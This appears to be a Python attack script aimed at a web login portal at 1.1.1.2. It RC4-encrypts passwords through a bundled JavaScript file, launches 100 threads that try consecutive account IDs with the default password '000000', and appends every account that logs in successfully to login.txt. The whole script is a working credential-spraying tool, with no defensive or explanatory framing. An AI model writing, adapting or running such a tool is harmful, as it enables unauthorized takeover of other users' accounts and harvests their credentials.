# 多线程
import threading
import time
import requests
import json
import execjs
def login(id,pwd):
    # 从1980年1月1日到现在的秒数
    with open('rc4.js', 'r', encoding='utf-8') as f:
        js = f.read()
    ctx = execjs.compile(js)
    # 从1980年1月1日到现在的秒数
    time1=int(time.time())
    truepwd= ctx.call('do_encrypt_rc4',str(pwd),str(time1))
    print(truepwd,time1)
    url = "http://1.1.1.2/homepage/login.php"
    data={"opr":"login","userName":id,"pwd":truepwd,"auth_tag":time1}
    print(data)
    r = requests.post(url,data=data)
    print(r.text)
    json1=json.loads(r.text)
    print(json1["success"])
    if json1["success"]==True:
        # 格式化输出时间
        time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        # 保存账号密码到文件
        f=open("login.txt","a")
        f.write("\r\n"+id+"  "+pwd)
        f.close()
    return r.text

if __name__ == '__main__':
    # id = input("输入账号")
    # password = input("输入密码")
    # login(id,password)
    # 多线程
    id=431119390030000
    for i in range(100):
        id1="0"+str(id)
        t = threading.Thread(target=login, args=(str(id1),"000000"))
        t.start()
        print("\033[36;31;40m启动线程"+str(i)+"\033[0m")
        id=id+1
